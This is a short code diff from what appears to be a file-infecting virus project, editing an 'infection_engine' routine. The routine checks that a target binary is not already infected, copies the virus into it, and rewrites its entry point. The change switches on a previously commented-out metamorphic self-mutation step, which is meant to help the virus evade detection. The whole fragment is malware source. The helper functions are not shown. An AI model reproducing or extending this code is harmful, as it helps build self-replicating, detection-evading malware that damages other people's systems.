@@ -108,7 +108,7 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, str
 	|| !not_infected(&original_entry, original_ref)
 	|| !copy_virus_to_clone(clone_ref, &original_entry, vhdr)
 	// || !generate_seed(&seed, clone_ref)
-	// || !metamorph_self(clone_ref, &virus_size, &virus_func_shift, *loader_off, seed)
+	|| !metamorph_self(clone_ref, &virus_size, &virus_func_shift, *loader_off, seed)
 	|| !adapt_virus_call_in_loader(clone_ref, *loader_off, virus_func_shift)
 	|| !define_shift_amount(&original_entry, &mut shift_amount, virus_size)
 	|| !copy_client_to_clone(clone_ref, original_ref, *loader_off, shift_amount, original_ref.size)
@@ -116,7 +116,6 @@ bool		infection_engine(struct virus_header *vhdr, struct safe_ptr clone_ref, str
 	|| !find_entry(&mut clone_entry, clone_ref)
 	|| !adjust_sizes(&mut clone_entry, shift_amount, virus_size)
 	|| !setup_virus_header(clone_ref, *loader_off, virus_size, seed)
-	// || !setup_virus_header(clone_ref, *loader_off, virus_size, seed, vhdr->loader_entry)
 	|| !change_entry(clone_ref, &original_entry))
 		return errors(ERR_THROW, _ERR_INFECTION_ENGINE);
 
